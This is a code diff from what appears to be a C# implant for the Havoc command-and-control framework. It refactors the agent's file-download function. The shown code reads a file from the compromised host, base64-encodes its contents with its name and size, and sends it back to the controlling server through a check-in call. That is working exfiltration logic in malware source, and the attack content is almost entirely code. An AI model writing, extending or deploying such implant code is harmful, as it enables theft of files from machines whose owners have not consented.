@@ -6,7 +6,7 @@ using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading.Tasks;
+using HavocImplant.Communications;
 
 namespace HavocImplant.AgentFunctions
 {
@@ -36,13 +36,13 @@ namespace HavocImplant.AgentFunctions
                 {
                     byte[] fileBytes = File.ReadAllBytes(downloadLocation);
                     string base64Bytes = Convert.ToBase64String(fileBytes);
-                    Dictionary<string, string> jsonAssDick = new Dictionary<string, string>();
-                    jsonAssDick.Add("FileSize", fileBytes.Length.ToString());
-                    jsonAssDick.Add("FileName", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("\\", "\\\\\\\\"));
-                    jsonAssDick.Add("FileContent", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n"));
-                    string postData = Implant.stringDictionaryToJson(jsonAssDick);
+                    Dictionary<string, string> FileData = new Dictionary<string, string>();
+                    FileData.Add("FileSize", fileBytes.Length.ToString());
+                    FileData.Add("FileName", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("\\", "\\\\\\\\"));
+                    FileData.Add("FileContent", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n"));
+                    string postData = Utils.DictionaryToJson(FileData);
                     //string jsonString = "{\"FileSize\": \"{1}\", \"FileName\": \"{0}\", \"FileContent\": \"{2}\"".Replace("{1}", fileBytes.Length.ToString()).Replace("{0}", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("{2}", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n")));
-                    agent.CheckIn(postData, "download");
+                    Comms.CheckIn(agent, postData, "download");
                     agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nSuccessfully downloaded {downloadLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
                     return;
                 }
